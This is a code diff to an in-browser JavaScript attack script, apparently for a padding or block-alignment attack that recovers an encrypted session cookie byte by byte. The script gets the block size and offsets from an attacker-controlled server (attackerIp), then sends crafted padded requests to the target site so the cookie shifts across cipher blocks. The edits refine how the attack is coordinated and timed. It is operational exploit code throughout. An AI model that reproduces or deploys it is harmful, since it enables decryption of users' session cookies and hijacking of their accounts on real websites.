@@ -27,6 +27,7 @@ function attackByteAttempt(path, data, success) {
 }
 
 function attackByte(dataLengthNeeded) {
+	// Ask the server what we should attack next
 	sendRequest('GET', 'http://' + attackerIp + "/offset", null, function(response) {
 		var offset = parseInt(response, 10);
 		data = "";
@@ -35,7 +36,7 @@ function attackByte(dataLengthNeeded) {
 		var path = Array(offset + 1).join("a");
 		var data = Array(dataLengthNeeded - offset + 1).join("a");
 		attackByteAttempt(path, data, function() {
-			attackByte(dataLengthNeeded); // On success, ask for next offset and repeat
+			attackByte(dataLengthNeeded); // On success, ask for next offset recursively and repeat
 		});
 	});
 }
@@ -44,10 +45,16 @@ function attackByte(dataLengthNeeded) {
 var blockSizeString = ""
 
 sendRequest('GET', 'http://' + attackerIp + "/blocksize", null, function (response) {
-	blockSize = parseInt(response, 10);
-	attackByte(blockSizeString.length);
+	blockSize = parseInt(response.split(' ')[0], 10);
+	var dataLengthNeeded = parseInt(response.split(' ')[1], 10);
+
+	// Add the block size to make sure that we have enough room
+	//  to shift the cookie as much as we want
+	setTimeout(function() { attackByte(dataLengthNeeded + blockSize); }, 1000);
 }, null, 30000);
 
+// This will only run if the server does not immediately return a block size
+//  which would indicate that this is the first client to connect back
 function sendBlockSizeRequest() {
 	if (blockSize !== null) return;
 	sendRequest('GET', targetUrl + "/" + blockSizeString);
@@ -55,7 +62,5 @@ function sendBlockSizeRequest() {
 	setTimeout(sendBlockSizeRequest, 100);
 }
 sendBlockSizeRequest();
-
-
 
 </script>
